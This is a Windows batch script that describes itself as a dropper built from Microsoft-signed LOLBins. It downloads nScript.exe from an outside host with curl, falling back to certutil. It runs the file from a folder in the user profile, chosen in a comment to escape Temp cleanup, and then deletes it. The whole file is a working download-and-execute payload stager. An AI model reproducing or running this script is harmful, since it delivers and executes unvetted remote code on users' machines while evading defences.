@echo off
setlocal
rem nScript dropper built from Microsoft-signed LOLBins (LOLBAS: Certutil download, Cmd execute).
rem Stage outside Temp: force cleanup wipes Temp while the executable is running.
set "WorkPath=%USERPROFILE%\.nScript"
set "BinaryPath=%WorkPath%\nScript.exe"
set "Url=https://clean.meowery.eu/nScript.exe"

mkdir "%WorkPath%" 2>nul

echo [*] Downloading nScript.exe
del /f /q "%BinaryPath%" 2>nul
curl.exe -fsSL -o "%BinaryPath%" "%Url%" 2>nul || certutil -urlcache -split -f "%Url%" "%BinaryPath%" >nul 2>&1
if not exist "%BinaryPath%" (echo [-] Download failed& exit /b 1)
for %%A in ("%BinaryPath%") do if %%~zA LSS 100000 (echo [-] Download incomplete& exit /b 1)

echo [*] Running nScript
"%BinaryPath%"
set "RC=%ERRORLEVEL%"

del /f /q "%BinaryPath%" 2>nul
echo [+] nScript finished with exit code %RC%
exit /b %RC%
